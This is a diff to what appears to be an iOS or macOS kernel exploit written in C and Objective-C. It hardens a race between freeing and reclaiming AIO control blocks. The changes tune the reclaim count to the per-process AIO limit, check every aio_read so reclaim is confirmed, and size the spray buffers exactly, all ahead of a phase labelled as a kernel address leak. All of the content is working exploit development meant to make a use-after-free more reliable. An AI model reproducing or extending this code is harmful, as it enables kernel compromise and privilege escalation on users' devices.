@@ -233,7 +233,7 @@ static const char kOpenPropertiesGarbage[] =
 #ifndef SIGEV_KEVENT
 #define SIGEV_KEVENT 4
 #endif
-#define AIO_NRECLAIM 8
+#define AIO_NRECLAIM 7   // 7 reclaim + 1 trigger = 8 (per-process AIO limit). Leave margin.
 
 struct aio_race_state {
     atomic_bool start, stop;
@@ -259,11 +259,16 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             ssize_t r = aio_return(s->trigger);
             if (r >= 0) {
                 atomic_fetch_add(&s->freed, 1);
-                // If rcbs is set, reclaim via aio_read (LIFO reuse)
+                // If rcbs is set, reclaim via aio_read (LIFO reuse).
+                // Check ALL return values — any failure means slot wasn't filled.
                 if (s->rcbs && s->nrcbs > 0) {
-                    for (int i = 0; i < s->nrcbs; i++)
-                        aio_read(&s->rcbs[i]);
-                    atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                    int ok = 0;
+                    for (int i = 0; i < s->nrcbs; i++) {
+                        if (aio_read(&s->rcbs[i]) == 0) ok++;
+                    }
+                    if (ok == s->nrcbs) {
+                        atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                    }
                 }
                 return NULL;
             }
@@ -5667,7 +5672,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"fd=%d file=32KB pid=%d uid=%d", fd, getpid(), getuid()]];
 
     static struct aiocb rcbs[AIO_NRECLAIM];
-    static char rbufs[AIO_NRECLAIM][16384];  // 16KB buffers for 8KB reads
+    static char rbufs[AIO_NRECLAIM][8192];   // exact fit for 0x2000 nbytes
 
     // ---- Phase A: Control confirmation + kernel addr leak ----
     // Use distinctive reclaim nbytes (0x4141) to prove ext[1] comes from reclaim entry.
